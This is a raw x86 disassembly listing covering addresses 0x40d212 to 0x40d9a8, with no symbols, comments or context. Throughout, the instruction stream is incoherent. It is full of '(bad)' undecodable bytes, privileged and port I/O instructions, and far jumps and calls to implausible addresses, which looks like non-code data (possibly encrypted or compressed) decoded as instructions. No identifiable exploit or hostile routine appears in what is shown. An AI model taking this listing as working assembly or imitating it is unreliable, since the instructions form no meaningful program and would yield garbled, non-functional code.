  40d212:	dec    eax
  40d213:	mov    esp,DWORD PTR [edi+0x7d]
  40d216:	mov    eax,ds:0x26fc78cd
  40d21b:	pop    edi
  40d21c:	adc    eax,0x73446bcf
  40d221:	xor    DWORD PTR [edi+0x1fbb8835],edi
  40d227:	outs   dx,DWORD PTR ds:[esi]
  40d228:	bound  esi,QWORD PTR [ebp+0x73472f6c]
  40d22e:	adc    al,0xf2
  40d230:	scas   al,BYTE PTR es:[edi]
  40d231:	scas   eax,DWORD PTR es:[edi]
  40d232:	dec    ebx
  40d233:	mov    esi,0xedaedddd
  40d238:	pop    esi
  40d239:	fcom   DWORD PTR [ebp-0x54]
  40d23c:	xor    bl,BYTE PTR [ebp+0x19]
  40d23f:	fstp   TBYTE PTR [ebx-0x34]
  40d242:	je     0x40d1f2
  40d244:	push   0x6b6a2df5
  40d249:	adc    eax,0x13901651
  40d24e:	inc    eax
  40d24f:	les    ebx,FWORD PTR ds:0x5783f3a6
  40d255:	lds    edx,FWORD PTR [ebp-0x3a]
  40d258:	fsubr  st,st(1)
  40d25a:	push   ss
  40d25b:	and    al,al
  40d25d:	push   0x65e110
  40d262:	xchg   edi,eax
  40d263:	enter  0x98dd,0x1d
  40d267:	scas   al,BYTE PTR es:[edi]
  40d268:	sub    ecx,DWORD PTR [ecx]
  40d26a:	iret   
  40d26b:	add    ch,BYTE PTR ds:0xf4f8b8ab
  40d271:	aaa    
  40d272:	cli    
  40d273:	sbb    al,0x2f
  40d275:	fstp   TBYTE PTR [edx+0x5867e4d6]
  40d27b:	cmc    
  40d27c:	pop    es
  40d27d:	add    al,0x46
  40d27f:	mov    ss,WORD PTR [edi]
  40d281:	sbb    BYTE PTR [edx-0x16],0x49
  40d285:	(bad)  
  40d286:	cdq    
  40d287:	and    esp,DWORD PTR [edx]
  40d289:	les    eax,FWORD PTR ss:[ebx+0xe]
  40d28d:	shl    dl,cl
  40d28f:	push   edi
  40d290:	cmp    esp,esi
  40d292:	cld    
  40d293:	dec    esi
  40d294:	fwait
  40d295:	jmp    0xe4f34888
  40d29a:	das    
  40d29b:	add    ecx,DWORD PTR [edx-0x30]
  40d29e:	pop    ss
  40d29f:	or     al,0x28
  40d2a1:	cdq    
  40d2a2:	(bad)  
  40d2a3:	retf   0xda14
  40d2a6:	or     BYTE PTR [ecx],0xe6
  40d2a9:	rcl    BYTE PTR [edi-0x16b03079],0x60
  40d2b0:	mov    al,0x21
  40d2b2:	adc    al,0x7b
  40d2b4:	mov    BYTE PTR [esi-0x45],bh
  40d2b7:	inc    eax
  40d2b8:	pop    esp
  40d2b9:	jne    0x40d26b
  40d2bb:	mov    ecx,0x3c1159eb
  40d2c0:	outs   dx,DWORD PTR ds:[esi]
  40d2c1:	clc    
  40d2c2:	xchg   edx,eax
  40d2c3:	pop    edi
  40d2c4:	and    ah,BYTE PTR [ebp+0x305e62a5]
  40d2ca:	stos   BYTE PTR es:[edi],al
  40d2cb:	inc    edx
  40d2cc:	ror    dl,0xa3
  40d2cf:	sbb    eax,0x4c739014
  40d2d4:	retf   
  40d2d5:	sbb    al,0x59
  40d2d7:	and    edx,DWORD PTR ds:0x6c6e59b2
  40d2dd:	shr    BYTE PTR [esi-0x40dcbc8e],cl
  40d2e3:	fwait
  40d2e4:	call   0x399ecfb3
  40d2e9:	mov    gs,WORD PTR [ecx-0xbb76432]
  40d2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f0:	jge    0x40d2be
  40d2f2:	in     al,0xc
  40d2f4:	in     eax,dx
  40d2f5:	or     BYTE PTR ds:0x1b0fbabd,cl
  40d2fb:	aaa    
  40d2fc:	out    0x75,eax
  40d2fe:	jmp    0x74c86fe6
  40d303:	shr    DWORD PTR [ebx+0x2d5ef1c6],0x6e
  40d30a:	loopne 0x40d35a
  40d30c:	mov    dh,0xe6
  40d30e:	or     cl,cl
  40d310:	repz mov ch,0xd3
  40d313:	out    0x39,eax
  40d315:	sub    eax,0xd0cc25be
  40d31a:	jns    0x40d2a7
  40d31c:	retf   0x6cf6
  40d31f:	shl    BYTE PTR [ebp-0x424a33da],1
  40d325:	push   edi
  40d326:	imul   edi,ecx,0x65d57282
  40d32c:	test   DWORD PTR [edi+0x1178384],ebx
  40d332:	xor    esp,DWORD PTR [edi-0x49]
  40d335:	into   
  40d336:	pop    ds
  40d337:	mov    edi,0xfd7e8a84
  40d33c:	loope  0x40d2db
  40d33e:	jo     0x40d2c9
  40d340:	sub    edi,DWORD PTR [eax]
  40d342:	fnsave [ecx+0x23]
  40d345:	cmp    dh,BYTE PTR [ebx-0x28]
  40d348:	lss    esp,FWORD PTR [edi-0x4]
  40d34c:	(bad)  
  40d34d:	ss xchg ebx,eax
  40d34f:	fsub   QWORD PTR [ebx-0x6]
  40d352:	fidiv  DWORD PTR [ebp+0x9]
  40d355:	adc    eax,0x28740cdb
  40d35a:	or     al,0x68
  40d35c:	pop    esp
  40d35d:	xchg   BYTE PTR [ebx+0x2691231c],bh
  40d363:	xor    al,0xf3
  40d365:	cli    
  40d366:	(bad)  
  40d367:	outs   dx,BYTE PTR ds:[esi]
  40d368:	(bad)  
  40d369:	or     eax,0x54ed6115
  40d36e:	and    dh,bh
  40d370:	in     al,0x52
  40d372:	sti    
  40d373:	imul   edx,DWORD PTR [edx+0x63],0xc
  40d377:	test   al,0x19
  40d379:	mov    esi,0x48cba2f7
  40d37e:	sahf   
  40d37f:	mov    ecx,0xbf336efe
  40d384:	add    DWORD PTR [ebx-0x4e75f077],esi
  40d38a:	xor    DWORD PTR [esi+edx*8+0x3749d61f],edx
  40d391:	scas   eax,DWORD PTR es:[edi]
  40d392:	cld    
  40d393:	jmp    0x40d33b
  40d395:	call   0x51cb1f87
  40d39a:	mov    edx,0x6d26f092
  40d39f:	pop    edx
  40d3a0:	stos   DWORD PTR es:[edi],eax
  40d3a1:	mov    ah,0x99
  40d3a3:	push   cs
  40d3a4:	arpl   WORD PTR [edx],dx
  40d3a6:	stos   BYTE PTR es:[edi],al
  40d3a7:	je     0x40d3c5
  40d3a9:	rcr    BYTE PTR ds:0x880692ae,1
  40d3af:	dec    ebp
  40d3b0:	fwait
  40d3b1:	cmp    DWORD PTR [ecx],0xffffffed
  40d3b4:	cmp    BYTE PTR [ebx+edi*1-0x561dc691],ch
  40d3bb:	outs   dx,BYTE PTR ds:[esi]
  40d3bc:	cmp    dh,BYTE PTR [edx]
  40d3be:	add    edx,DWORD PTR [ebp-0x6f06fab8]
  40d3c4:	sub    al,0x91
  40d3c6:	inc    esp
  40d3c7:	aam    0xa
  40d3c9:	adc    cl,dl
  40d3cb:	js     0x40d353
  40d3cd:	out    dx,eax
  40d3ce:	das    
  40d3cf:	je     0x40d37f
  40d3d1:	loop   0x40d3b8
  40d3d3:	mov    ds:0x5ee0c788,eax
  40d3d8:	mov    ds:0x4f270c98,al
  40d3dd:	iret   
  40d3de:	fbstp  TBYTE PTR [edx]
  40d3e0:	xchg   DWORD PTR [ebp+0x67],ebx
  40d3e3:	pusha  
  40d3e4:	dec    ebx
  40d3e5:	mov    ds:0xf5ecf096,al
  40d3ea:	mov    eax,0x490c0ab4
  40d3ef:	int3   
  40d3f0:	jmp    0x40d3b8
  40d3f2:	cdq    
  40d3f3:	add    esp,ecx
  40d3f5:	ins    DWORD PTR es:[edi],dx
  40d3f6:	add    DWORD PTR [ebx-0x3d187514],0xd6721e03
  40d400:	and    eax,0x738402af
  40d405:	cmp    dl,cl
  40d407:	dec    ebp
  40d408:	sbb    ah,BYTE PTR [ecx-0x4b91e38c]
  40d40e:	pop    ebp
  40d40f:	fadd   QWORD PTR [ebx-0x7f]
  40d412:	sub    DWORD PTR [ecx+0x68029bde],esi
  40d418:	jns    0x40d3de
  40d41a:	idiv   DWORD PTR [esp+esi*1]
  40d41d:	cmc    
  40d41e:	push   0x26
  40d420:	xor    eax,0xcbc4706b
  40d425:	adc    BYTE PTR [edx],dh
  40d427:	or     BYTE PTR [ebx-0x1a],ah
  40d42a:	adc    BYTE PTR [eax],dh
  40d42c:	xor    esp,ebx
  40d42e:	or     eax,0xe2b7143c
  40d433:	imul   edx,DWORD PTR [ecx],0x685549aa
  40d439:	call   0x1bac:0x8971b627
  40d440:	jl     0x40d3c7
  40d442:	js     0x40d483
  40d444:	jns    0x40d497
  40d446:	gs (bad) 
  40d448:	sar    DWORD PTR [ebx-0x35b2523],cl
  40d44e:	inc    ecx
  40d44f:	test   BYTE PTR [ecx],bh
  40d451:	ror    BYTE PTR [edx+0x4a7003e8],1
  40d457:	push   0x26
  40d459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d45a:	mov    cl,0xd4
  40d45c:	pop    ebp
  40d45d:	(bad)  
  40d45f:	nop
  40d460:	and    al,0x92
  40d462:	pop    edi
  40d463:	out    0x90,eax
  40d465:	out    dx,eax
  40d466:	lea    ebx,[eax+edi*4]
  40d469:	fisttp WORD PTR [edx]
  40d46b:	inc    edx
  40d46c:	pop    ds
  40d46d:	jb     0x40d42b
  40d46f:	sub    BYTE PTR [esi+ecx*8+0x12b5c82b],dl
  40d476:	or     BYTE PTR [ecx-0x30],bh
  40d479:	rol    BYTE PTR [esi-0x5db1c3f6],1
  40d47f:	xor    ah,bl
  40d481:	sub    BYTE PTR [edi+ebp*4],bl
  40d484:	mov    ss,WORD PTR [esi-0x7c]
  40d487:	sti    
  40d488:	retf   0xc6d
  40d48b:	in     al,0x5b
  40d48d:	and    BYTE PTR [ebx],bh
  40d48f:	sbb    al,0x96
  40d491:	push   ss
  40d492:	mov    dh,0x7c
  40d494:	mov    bh,0x48
  40d496:	xchg   esp,eax
  40d497:	jo     0x40d4c2
  40d499:	es pushf 
  40d49b:	ss jnp 0x40d431
  40d49e:	push   cs
  40d49f:	ret    
  40d4a0:	ret    
  40d4a1:	inc    eax
  40d4a2:	xchg   ecx,eax
  40d4a3:	sub    esp,DWORD PTR [edi-0x36]
  40d4a6:	popf   
  40d4a7:	into   
  40d4a8:	xchg   ecx,eax
  40d4a9:	jno    0x40d491
  40d4ab:	xchg   edi,eax
  40d4ac:	xor    edi,DWORD PTR [eax-0x5a]
  40d4af:	mov    ds:0x128bd0f7,eax
  40d4b4:	into   
  40d4b5:	mov    esi,0xeab3d327
  40d4ba:	std    
  40d4bb:	jo     0x40d487
  40d4bd:	sbb    dl,0xa1
  40d4c0:	and    edx,DWORD PTR [edx-0x1b]
  40d4c3:	sti    
  40d4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4c5:	aaa    
  40d4c6:	mov    ecx,0xc5531b03
  40d4cb:	jns    0x40d477
  40d4cd:	div    BYTE PTR [edi+0x25]
  40d4d0:	add    eax,DWORD PTR [edx-0x27]
  40d4d3:	lods   eax,DWORD PTR ds:[esi]
  40d4d4:	arpl   WORD PTR [eax-0x14467ae],si
  40d4da:	cmp    DWORD PTR [ebx+0x2b],eax
  40d4dd:	adc    al,0x20
  40d4df:	out    0x31,eax
  40d4e1:	inc    edi
  40d4e2:	fnstenv [ebx+0x5ca007dc]
  40d4e8:	shl    DWORD PTR [edx+0x27],1
  40d4eb:	ret    0x7972
  40d4ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4ef:	adc    BYTE PTR [edi+ecx*8-0x40337d7],bl
  40d4f6:	(bad)  
  40d4f7:	sbb    BYTE PTR [eiz*4-0x6e3500e5],ch
  40d4fe:	aad    0xdc
  40d500:	inc    edi
  40d501:	out    dx,al
  40d502:	rcl    BYTE PTR [edi-0x66],0xfd
  40d506:	pusha  
  40d507:	and    eax,0x9d9cbd4f
  40d50c:	jns    0x40d535
  40d50e:	call   DWORD PTR [esi+0x4a]
  40d511:	xchg   DWORD PTR [edi-0x2cebfc69],esi
  40d517:	and    BYTE PTR ds:0x4c51e8d3,ah
  40d51d:	jb     0x40d4ab
  40d51f:	(bad)  
  40d520:	loop   0x40d599
  40d522:	scas   al,BYTE PTR es:[edi]
  40d523:	mov    bh,0xa3
  40d525:	pushf  
  40d526:	xchg   ecx,eax
  40d527:	pushf  
  40d528:	push   es
  40d529:	js     0x40d56c
  40d52b:	cmp    al,0xdc
  40d52d:	xor    BYTE PTR [ebx-0x42],0x43
  40d531:	aas    
  40d532:	push   ecx
  40d533:	ficomp DWORD PTR [ecx]
  40d535:	fstp   DWORD PTR [esi+0x704adaa0]
  40d53b:	(bad)  
  40d53c:	mov    esp,0x6c1c0bfb
  40d541:	xchg   esp,eax
  40d542:	jecxz  0x40d576
  40d544:	xchg   esp,eax
  40d545:	jmp    0x5a65:0xf708834f
  40d54c:	fwait
  40d54d:	dec    ecx
  40d54e:	sub    eax,0x68a9f7ab
  40d553:	cmp    DWORD PTR [ecx+0x5a9fcddb],ecx
  40d559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d55a:	jnp    0x40d551
  40d55c:	pop    esi
  40d55d:	test   al,0xe3
  40d55f:	rcl    esi,1
  40d561:	mov    cl,0x92
  40d563:	inc    esi
  40d564:	xchg   ebp,eax
  40d565:	adc    BYTE PTR [eax],0x6d
  40d568:	stos   DWORD PTR es:[edi],eax
  40d569:	imul   ebp,DWORD PTR [ebp+0x5b4fad97],0x73
  40d570:	mov    ds:0x1f2062dd,al
  40d575:	xor    ebp,DWORD PTR [eax]
  40d577:	hlt    
  40d578:	adc    edi,DWORD PTR [edx+0xe]
  40d57b:	pop    ds
  40d57c:	and    BYTE PTR [ebp-0x43],ch
  40d57f:	sar    DWORD PTR [edi+ebp*2+0x5aa30ab6],cl
  40d586:	and    eax,DWORD PTR [ebx-0x9]
  40d589:	fbstp  TBYTE PTR [esi-0x685f6fc7]
  40d58f:	push   eax
  40d590:	gs jo  0x40d5e5
  40d593:	aam    0x88
  40d595:	test   BYTE PTR [edx+0x58],0x47
  40d599:	adc    eax,0x17e14f6c
  40d59e:	jecxz  0x40d5ef
  40d5a0:	add    DWORD PTR [eax+0xa],ecx
  40d5a3:	in     al,dx
  40d5a4:	pop    esi
  40d5a5:	fcmovb st,st(4)
  40d5a7:	ins    DWORD PTR es:[edi],dx
  40d5a8:	push   eax
  40d5a9:	mov    ebx,0x8a38b55
  40d5ae:	jmp    0xc65e:0x7ce11018
  40d5b5:	push   ebp
  40d5b6:	sti    
  40d5b7:	sbb    DWORD PTR [edi-0x32fd99f4],eax
  40d5bd:	push   0xffffffce
  40d5bf:	mov    bh,0x72
  40d5c1:	push   ecx
  40d5c2:	retf   
  40d5c3:	nop
  40d5c4:	pop    ebp
  40d5c5:	add    eax,DWORD PTR [esi-0x435f7b8e]
  40d5cb:	push   ebx
  40d5cc:	xchg   ecx,eax
  40d5cd:	adc    DWORD PTR [esi-0x77],esi
  40d5d0:	leave  
  40d5d1:	mov    eax,0xad1e7c5c
  40d5d6:	fstp   QWORD PTR [ecx-0x5f]
  40d5d9:	aam    0xfd
  40d5db:	loope  0x40d5fd
  40d5dd:	repz (bad) 
  40d5df:	cld    
  40d5e0:	cwde   
  40d5e1:	xor    al,0x20
  40d5e3:	loope  0x40d5ee
  40d5e5:	adc    eax,0x45b30385
  40d5ea:	dec    edx
  40d5eb:	xchg   esp,eax
  40d5ec:	push   eax
  40d5ed:	in     eax,0x7
  40d5ef:	sbb    eax,0x7214f28a
  40d5f4:	xchg   DWORD PTR [esi-0x73],esi
  40d5f7:	sub    al,0x28
  40d5f9:	adc    ebx,0x9f8ac300
  40d5ff:	mov    edi,0x648643c
  40d604:	xor    DWORD PTR [ebx-0x428e7c52],0xe9a90bba
  40d60e:	jbe    0x40d5fc
  40d610:	add    esi,eax
  40d612:	mov    ds:0x5ab1e68f,al
  40d617:	or     cl,BYTE PTR [esi-0xf]
  40d61a:	mov    dl,BYTE PTR [esp+ebx*8]
  40d61d:	push   cs
  40d61e:	mov    dh,0x2e
  40d620:	jmp    0x40d663
  40d622:	ja     0x40d678
  40d624:	or     cl,BYTE PTR [ebx-0x58cf4ab3]
  40d62a:	jno    0x40d641
  40d62c:	and    edi,eax
  40d62e:	sbb    eax,eax
  40d630:	mov    al,0x64
  40d632:	xchg   ebp,eax
  40d633:	btc    esp,ebx
  40d636:	and    esp,DWORD PTR [edi*1-0x6aee5fd9]
  40d63d:	mov    edi,0x5152991a
  40d642:	(bad)  
  40d643:	mov    ch,0xb5
  40d645:	push   ss
  40d646:	xor    BYTE PTR [ecx],bh
  40d648:	mov    DWORD PTR [ebx+0xcb2b9e5],edx
  40d64e:	mov    al,0xb1
  40d650:	fisttp WORD PTR [ebp-0x3748c29e]
  40d656:	icebp  
  40d657:	es test eax,0xa26cc213
  40d65d:	sub    ah,BYTE PTR [ebx+0x3b]
  40d660:	add    al,0x3f
  40d662:	pop    esi
  40d663:	sbb    al,0x90
  40d665:	add    al,0x2
  40d667:	pop    es
  40d668:	inc    ah
  40d66a:	or     DWORD PTR [eax+0x3f820ef9],ebx
  40d670:	jl     0x40d639
  40d672:	pusha  
  40d673:	jno    0x40d681
  40d675:	xor    eax,0xcc88cdf9
  40d67a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d67b:	fld    TBYTE PTR [eax-0x4b]
  40d67e:	lods   eax,DWORD PTR ds:[esi]
  40d67f:	xchg   esp,eax
  40d680:	aad    0x68
  40d682:	pop    ebp
  40d683:	inc    ebp
  40d684:	ret    0x4777
  40d687:	dec    edx
  40d688:	pop    esi
  40d689:	js     0x40d66b
  40d68b:	adc    DWORD PTR [esi-0x55],eax
  40d68e:	push   esi
  40d68f:	lds    esp,FWORD PTR [eax+0x29]
  40d692:	stos   BYTE PTR es:[edi],al
  40d693:	stc    
  40d694:	aam    0x55
  40d696:	(bad)  
  40d697:	addr16 or cl,dl
  40d69a:	xor    ch,BYTE PTR [eax+ebx*4]
  40d69d:	ins    DWORD PTR es:[edi],dx
  40d69e:	sbb    BYTE PTR [ebx-0x2e60351b],dh
  40d6a4:	rcl    cl,cl
  40d6a6:	jns    0x40d6c6
  40d6a8:	mov    edx,0x48db7265
  40d6ad:	popf   
  40d6ae:	dec    esi
  40d6af:	aam    0x3e
  40d6b1:	es inc ebx
  40d6b3:	in     eax,0x84
  40d6b5:	mov    bl,0xe0
  40d6b7:	std    
  40d6b8:	or     DWORD PTR [ecx+esi*4],esi
  40d6bb:	rol    DWORD PTR [ecx+0x38eb4c8c],cl
  40d6c1:	(bad)  
  40d6c4:	mov    WORD PTR [esp+edi*1+0x3e],cs
  40d6c8:	int3   
  40d6c9:	adc    edx,DWORD PTR ds:0xb9fd3ffa
  40d6cf:	jmp    0xbb5a4e84
  40d6d4:	in     al,dx
  40d6d5:	mov    ch,0x86
  40d6d7:	sub    esi,DWORD PTR [esi+eax*4-0x7f]
  40d6db:	fs test eax,0x973b5aa4
  40d6e1:	scas   eax,DWORD PTR es:[edi]
  40d6e2:	push   cs
  40d6e3:	in     eax,dx
  40d6e4:	jge    0x40d717
  40d6e6:	pop    eax
  40d6e7:	add    al,0xd6
  40d6e9:	xchg   esi,eax
  40d6ea:	into   
  40d6eb:	aas    
  40d6ec:	cmp    ecx,DWORD PTR [eax-0x181881]
  40d6f2:	sub    al,al
  40d6f4:	push   es
  40d6f5:	mov    bh,0x2d
  40d6f7:	rol    al,cl
  40d6f9:	lock cli 
  40d6fb:	je     0x40d6e5
  40d6fd:	test   BYTE PTR [ebx-0x3d],cl
  40d700:	inc    esi
  40d701:	fisttp QWORD PTR [eax+edi*8+0x32]
  40d705:	or     ecx,edi
  40d707:	jecxz  0x40d74e
  40d709:	dec    ebx
  40d70a:	rol    DWORD PTR [eax+0x60],cl
  40d70d:	es mov ebx,ds
  40d710:	mov    bh,dl
  40d712:	jnp    0x694d4f0c
  40d718:	xor    eax,0x6bad071a
  40d71d:	nop
  40d71e:	mov    bl,0x17
  40d720:	nop
  40d721:	nop
  40d722:	sub    BYTE PTR [ebp-0x642f6c64],ch
  40d728:	sub    al,0x21
  40d72a:	inc    ecx
  40d72b:	imul   ebp,DWORD PTR [ecx+0x6aaa5e8b],0x8354ad14
  40d735:	lea    eax,[edx-0x1a]
  40d738:	xchg   ecx,eax
  40d739:	pop    esi
  40d73a:	pop    edx
  40d73b:	mov    dh,0x95
  40d73d:	xchg   BYTE PTR [edi-0x6db36f77],al
  40d743:	cmp    BYTE PTR [ebp+0x1f],ch
  40d746:	cdq    
  40d747:	test   eax,0xd54c0cca
  40d74c:	mov    eax,ds:0x3570d879
  40d751:	pop    edx
  40d752:	pop    esi
  40d753:	icebp  
  40d754:	lods   eax,DWORD PTR ds:[esi]
  40d755:	sar    dh,cl
  40d757:	xor    cl,BYTE PTR [edi-0x36f4f6f8]
  40d75d:	dec    ebx
  40d75e:	mov    ebp,esi
  40d760:	jle    0x40d77f
  40d762:	dec    esi
  40d763:	push   ebp
  40d764:	retf   
  40d765:	pushf  
  40d766:	jae    0x40d799
  40d768:	or     al,0x33
  40d76a:	mov    al,ds:0x7f0038d3
  40d76f:	xor    al,0x9c
  40d771:	and    ch,ah
  40d773:	pusha  
  40d774:	jnp    0x40d704
  40d776:	(bad)  
  40d777:	fs stos DWORD PTR es:[edi],eax
  40d779:	adc    DWORD PTR [eax],eax
  40d77b:	punpckldq mm5,DWORD PTR [ebx]
  40d77e:	aas    
  40d77f:	retf   0xa92e
  40d782:	mov    ecx,DWORD PTR [edx+edi*8]
  40d785:	(bad)  
  40d786:	jne    0x40d714
  40d788:	inc    ebp
  40d789:	sub    edi,eax
  40d78b:	repz inc ebx
  40d78d:	out    0xd7,al
  40d78f:	arpl   WORD PTR [ecx-0x396cd199],bx
  40d795:	not    bl
  40d797:	retf   
  40d798:	dec    esi
  40d799:	test   al,0xb8
  40d79b:	jne    0x40d7ea
  40d79d:	lds    ebx,FWORD PTR [ebp+edi*1+0x72]
  40d7a1:	stos   DWORD PTR es:[edi],eax
  40d7a2:	fwait
  40d7a3:	test   ch,ch
  40d7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7a6:	sbb    al,0xb5
  40d7a8:	mov    esp,esi
  40d7aa:	lea    ebx,[edx-0x12]
  40d7ad:	fnstsw WORD PTR [edx]
  40d7af:	hlt    
  40d7b0:	xor    al,0x3
  40d7b2:	ret    0x462c
  40d7b5:	dec    esi
  40d7b6:	ss mov al,0xf3
  40d7b9:	stc    
  40d7ba:	cmp    al,0x62
  40d7bc:	dec    edx
  40d7bd:	repz mov ds:0xfb8e9fb3,eax
  40d7c3:	sub    edi,edi
  40d7c5:	bnd fs ja 0x40d750
  40d7c9:	stos   BYTE PTR es:[edi],al
  40d7ca:	dec    esp
  40d7cb:	xchg   esp,eax
  40d7cc:	cmp    al,0x55
  40d7ce:	mov    ebp,edx
  40d7d0:	imul   esp,DWORD PTR [esi],0x5
  40d7d3:	pop    edi
  40d7d4:	cmp    eax,0x2f2aebfe
  40d7d9:	inc    esp
  40d7da:	(bad)  
  40d7dc:	mov    ebp,0xc82719bc
  40d7e1:	call   0xf926:0x5522fa6a
  40d7e8:	jae    0x40d836
  40d7ea:	in     al,0x52
  40d7ec:	mov    eax,ds:0xaa364f3
  40d7f1:	jge    0x40d815
  40d7f3:	jle    0x40d798
  40d7f5:	ds (bad) 
  40d7f8:	(bad)  
  40d7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7fb:	mov    esi,0x3a0e93d9
  40d800:	sbb    dl,BYTE PTR [edi]
  40d802:	xchg   esi,eax
  40d803:	adc    edx,DWORD PTR [esp+ebp*4+0x28]
  40d807:	outs   dx,DWORD PTR ds:[esi]
  40d808:	xor    ecx,DWORD PTR [edx+eiz*1+0x18c1f10]
  40d80f:	push   0x2f
  40d811:	fsub   DWORD PTR [edi-0x23bd976a]
  40d817:	jp     0x40d83f
  40d819:	jp     0x40d80a
  40d81b:	in     eax,dx
  40d81c:	pop    DWORD PTR [ebx-0x4bb6c895]
  40d822:	ja     0x40d828
  40d824:	call   0x9e96:0xb1ed9b04
  40d82b:	js     0x40d87c
  40d82d:	in     al,0x57
  40d82f:	out    dx,al
  40d830:	pop    ebx
  40d831:	or     al,0xa3
  40d833:	push   esi
  40d834:	(bad)  
  40d835:	std    
  40d836:	dec    ebp
  40d837:	and    cl,cl
  40d839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d83a:	fwait
  40d83b:	adc    dl,ah
  40d83d:	or     BYTE PTR [esi],dh
  40d83f:	test   ebx,edi
  40d841:	or     dh,BYTE PTR [esi-0x59]
  40d844:	and    al,0xaa
  40d846:	adc    BYTE PTR ds:0xcb57c857,dl
  40d84c:	add    al,0x7d
  40d84e:	sub    ch,BYTE PTR [eax+0x1bcd8bac]
  40d854:	xchg   ecx,eax
  40d855:	enter  0x946f,0x6a
  40d859:	mov    ds:0x5e294510,eax
  40d85e:	mov    ah,0x3d
  40d860:	icebp  
  40d861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d862:	cwde   
  40d863:	and    dh,al
  40d865:	movaps xmm0,xmm2
  40d868:	pop    ds
  40d869:	(bad)  
  40d86a:	rol    dl,1
  40d86c:	xor    al,0x1
  40d86e:	inc    eax
  40d86f:	mov    ebp,0x4db67478
  40d874:	jnp    0x40d886
  40d876:	mov    dh,0xf6
  40d878:	in     al,0xd5
  40d87a:	out    0x72,eax
  40d87c:	mov    eax,DWORD PTR [edx+0x47]
  40d87f:	out    0x76,eax
  40d881:	inc    ecx
  40d882:	clc    
  40d883:	call   0x1bf8d758
  40d888:	jo     0x40d811
  40d88a:	or     ecx,DWORD PTR ds:0x7306a1a9
  40d890:	mov    edx,0x354b8046
  40d895:	pusha  
  40d896:	mov    ebp,0x30f227fb
  40d89b:	sub    al,0x25
  40d89d:	into   
  40d89e:	mov    ds:0x62423e75,eax
  40d8a3:	mov    ch,0x44
  40d8a5:	adc    ecx,DWORD PTR [ebx-0x67]
  40d8a8:	add    bl,BYTE PTR [edi]
  40d8aa:	xchg   edi,eax
  40d8ab:	je     0x40d841
  40d8ad:	inc    esp
  40d8ae:	bound  eax,QWORD PTR [ebx+0x72]
  40d8b1:	inc    ecx
  40d8b2:	cmp    edx,DWORD PTR [edi]
  40d8b4:	in     al,0x40
  40d8b6:	lahf   
  40d8b7:	inc    esp
  40d8b8:	pop    eax
  40d8b9:	jg     0x40d8df
  40d8bb:	sub    eax,0xf8978de7
  40d8c0:	and    dl,BYTE PTR [ebx+edx*2+0x48]
  40d8c4:	dec    edi
  40d8c5:	cmp    ecx,ebx
  40d8c7:	retf   
  40d8c8:	sbb    ebx,DWORD PTR [ebp+eax*8-0x7]
  40d8cc:	sbb    DWORD PTR [ebx+0x5f37526f],edi
  40d8d2:	push   ebx
  40d8d3:	push   es
  40d8d4:	mov    al,ds:0x8e5b12bb
  40d8d9:	adc    eax,0x75ea1810
  40d8de:	push   0xd2522f50
  40d8e3:	xchg   cx,ax
  40d8e5:	push   ss
  40d8e6:	adc    al,0xea
  40d8e8:	jl     0x40d947
  40d8ea:	out    dx,eax
  40d8eb:	mov    edx,0xac335dba
  40d8f0:	fdiv   QWORD PTR [esi+edi*4]
  40d8f3:	inc    esi
  40d8f4:	pop    eax
  40d8f5:	pop    ss
  40d8f6:	cdq    
  40d8f7:	dec    esi
  40d8f8:	jecxz  0x40d891
  40d8fa:	cld    
  40d8fb:	push   cs
  40d8fc:	sbb    DWORD PTR [esi-0x54bf12ec],esi
  40d902:	cmp    bh,BYTE PTR [ebx]
  40d904:	shl    BYTE PTR [edx],1
  40d906:	add    al,BYTE PTR ds:0xfb5faf8d
  40d90c:	call   0xb2c8cb27
  40d911:	test   BYTE PTR [esi+0x7f],ah
  40d914:	(bad)  
  40d915:	lahf   
  40d916:	clc    
  40d917:	dec    esp
  40d918:	jecxz  0x40d916
  40d91a:	xchg   edx,eax
  40d91b:	pop    ebx
  40d91c:	xor    bl,0x9b
  40d91f:	mov    ch,0xbd
  40d921:	(bad)  
  40d922:	pop    edx
  40d923:	jo     0x40d93b
  40d925:	adc    DWORD PTR [edi+0x4579fa24],eax
  40d92b:	fwait
  40d92c:	mov    edi,0x9230bb10
  40d931:	shl    ebp,cl
  40d933:	jge    0x40d9a5
  40d935:	and    esp,DWORD PTR [eax-0x987ce63]
  40d93b:	xlat   BYTE PTR ds:[ebx]
  40d93c:	stos   BYTE PTR es:[edi],al
  40d93d:	mov    eax,ecx
  40d93f:	dec    ebp
  40d940:	out    0xda,al
  40d942:	popa   
  40d943:	dec    edx
  40d944:	call   0x13024d50
  40d949:	pop    esi
  40d94a:	push   ds
  40d94b:	icebp  
  40d94c:	lahf   
  40d94d:	pminsw mm0,mm0
  40d950:	dec    edx
  40d951:	into   
  40d952:	lods   eax,DWORD PTR ds:[esi]
  40d953:	aam    0x8e
  40d955:	out    0xc5,al
  40d957:	add    eax,ebp
  40d959:	sbb    ecx,DWORD PTR [esi+0x1b80c50f]
  40d95f:	mov    ah,0xa
  40d961:	sub    al,0xc9
  40d963:	mov    fs,ebx
  40d965:	push   ds
  40d966:	clc    
  40d967:	add    DWORD PTR [ebx-0x2125e0ec],esi
  40d96d:	call   0xc711:0xfc1eab57
  40d974:	push   0xfd7c14e6
  40d979:	cwde   
  40d97a:	pop    es
  40d97b:	pop    esp
  40d97c:	jmp    0x951b8dc6
  40d981:	mov    ds:0x192e229e,al
  40d986:	mov    ?,WORD PTR [ebx]
  40d988:	stc    
  40d989:	or     DWORD PTR [edi+0x6fef4e4b],eax
  40d98f:	sbb    BYTE PTR [eax+0x372776ab],al
  40d995:	(bad)  
  40d996:	push   esp
  40d997:	sbb    DWORD PTR [ebp-0x115938a5],esi
  40d99d:	sbb    ebx,eax
  40d99f:	push   ss
  40d9a0:	mov    esi,0xed633829
  40d9a5:	fstp   st(7)
  40d9a7:	push   edx
  40d9a8:	dec    edi
